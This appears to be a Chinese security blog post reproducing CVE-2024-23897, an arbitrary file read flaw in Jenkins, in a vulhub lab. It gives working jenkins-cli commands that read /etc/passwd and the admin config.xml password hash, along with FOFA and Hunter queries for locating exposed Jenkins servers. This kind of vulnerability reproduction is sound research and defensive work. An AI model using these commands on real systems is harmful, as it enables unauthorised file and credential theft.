#  【漏洞复现】CVE-2024-23897 Jenkins 任意文件读取漏洞   
原创 4Zen  划水但不摆烂   2024-01-27 08:00  
  
## 免责声明   
  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
## 产品简介   
  
Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成。  
## 漏洞描述   
  
Jenkins 有一个内置的命令行界面CLI，在处理 CLI 命令时Jenkins 使用args4j 库解析 Jenkins 控制器上的命令参数和选项。此命令解析器具有一个功能，可以将@参数中后跟文件路径的字符替换为文件内容 ( expandAtFiles)。  
## 影响版本   
```
Jenkins <= 2.441
Jenkins LTS <= 2.426.2

```  
## 网络测绘   
  
favicon图标特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmWLSvR8Gjp8mO4TKibq8SCN5w1qUszUP0GicNT9hJTYkSr1OK5ia0Z7Zhxw/640?wx_fmt=png&from=appmsg "")  
  
FOFA网络测绘搜索  
```
app="Jenkins"

```  
  
鹰图网络测绘搜索  
```
app.name="Jenkins"

```  
## 漏洞复现   
  
用vulhub搭建一个老版本的Jenkins环境  
```
/vulhub/jenkins/CVE-2018-1000861
docker compose up -d

```  
  
环境启动成功会如下图所示  
  
http://192.168.13.133:8080/![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmWDPQMt9JibwqTHWfjTOXEbTeZ6EAytiacV3yXmQP3lMRibn13GHkumwicHA/640?wx_fmt=png&from=appmsg "")  
  
  
根据官方文档，从 Jenkins 控制器的 URL 下载 CLI 客户端 JENKINS_URL/jnlpJars/jenkins-cli.jar  
  
那么我们这里就是http://192.168.13.133:8080/jnlpJars/jenkins-cli.jar  
  
尝试读取/etc/passwd文件  
```
java8 -jar jenkins-cli.jar -s http://192.168.13.133:8080 connect-node "@/etc/passwd"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmWnCnFF3Tno1mduCPStHxnEibeFLNbRtQHK6powREuXlJarmbZDgoZgDw/640?wx_fmt=png&from=appmsg "")  
  
尝试在漏洞环境写入字符串到一个文件中测试读取  
```
docker ps
docker exec -it 容器ID bash
echo "huashui2333" > /tmp/hs.txt

```  
```
java8 -jar jenkins-cli.jar -s http://192.168.13.133:8080 connect-node "@/tmp/hs.txt"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmWOuGBESDibbWS2WBmrL4FLorUeE4yDCTmMTZJYnsTYY8zrwX9ibAof6ibw/640?wx_fmt=png&from=appmsg "")  
  
读取管理员密码Hash解密  
```
java8 -jar jenkins-cli.jar -s http://192.168.13.133:8080 connect-node "@/var/jenkins_home/users/admin/config.xml"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmWejicGUVa0u8FW8wbNARc4XiczQuiaRIzdevJbuYia4JFibMZHH83Fd9p4HA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagwj8icXbXD6ZHIVrblfPYfmW89EEfkAuMdzIOLGQwpqD55D55yRRHTGLxkEOUsqkfvm5C1db6c8uGg/640?wx_fmt=png&from=appmsg "")  
## 思路拓展   
  
jenkins后渗透 - zpchcbd - 博客园(https://www.cnblogs.com/zpchcbd/p/17573272.html)  
## 修复方案   
  
升级至新版本  
  
https://www.jenkins.io/  
  
  
